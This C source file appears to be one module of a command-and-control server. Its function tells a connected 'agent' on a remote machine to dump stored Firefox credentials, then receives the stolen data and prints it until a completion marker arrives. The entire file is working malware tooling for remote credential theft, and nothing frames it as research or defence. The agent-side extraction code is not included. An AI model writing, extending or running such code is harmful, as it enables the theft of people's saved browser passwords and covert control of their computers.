#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 8192

// External references from server.c
extern pthread_mutex_t clients_mutex;

typedef struct {
    int id;
    int socket;
    struct sockaddr_in addr;
    time_t connected_at;
    int active;
    pthread_mutex_t lock;
} Client;

extern Client clients[];

// Helper function to find client
static int find_client_socket(int client_id, int *client_index) {
    pthread_mutex_lock(&clients_mutex);
    for (int i = 0; i < 50; i++) {
        if (clients[i].active && clients[i].id == client_id) {
            int sock = clients[i].socket;
            *client_index = i;
            pthread_mutex_unlock(&clients_mutex);
            return sock;
        }
    }
    pthread_mutex_unlock(&clients_mutex);
    return -1;
}

void module_firefox_dump(int client_id) {
    int client_socket = -1;
    int client_index = -1;
    
    client_socket = find_client_socket(client_id, &client_index);
    
    if (client_socket == -1) {
        printf("[-] Agent %d not found or disconnected\n", client_id);
        return;
    }
    
    printf("\n[*] Firefox Credential Dump Module\n");
    printf("[*] Sending extraction command to agent %d...\n\n", client_id);
    
    // Send special command to trigger firefox dump on client
    const char *command = "FIREFOX_DUMP\n";
    
    pthread_mutex_lock(&clients[client_index].lock);
    ssize_t sent = send(client_socket, command, strlen(command), 0);
    
    if (sent <= 0) {
        pthread_mutex_unlock(&clients[client_index].lock);
        printf("[-] Failed to send command to agent\n");
        return;
    }
    
    // Receive results from client
    char buffer[BUFFER_SIZE];
    printf("=== Firefox Credentials ===\n\n");
    
    int receiving = 1;
    while (receiving) {
        memset(buffer, 0, BUFFER_SIZE);
        ssize_t received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        
        if (received <= 0) {
            printf("\n[-] Agent disconnected\n");
            pthread_mutex_unlock(&clients[client_index].lock);
            return;
        }
        
        // Check for end marker
        if (strstr(buffer, "DUMP_COMPLETE") != NULL) {
            // Remove the marker and print remaining data
            char *marker = strstr(buffer, "DUMP_COMPLETE");
            *marker = '\0';
            if (strlen(buffer) > 0) {
                printf("%s", buffer);
            }
            receiving = 0;
        } else {
            printf("%s", buffer);
            fflush(stdout);
        }
    }
    
    pthread_mutex_unlock(&clients[client_index].lock);
    printf("\n[*] Extraction complete\n\n");
}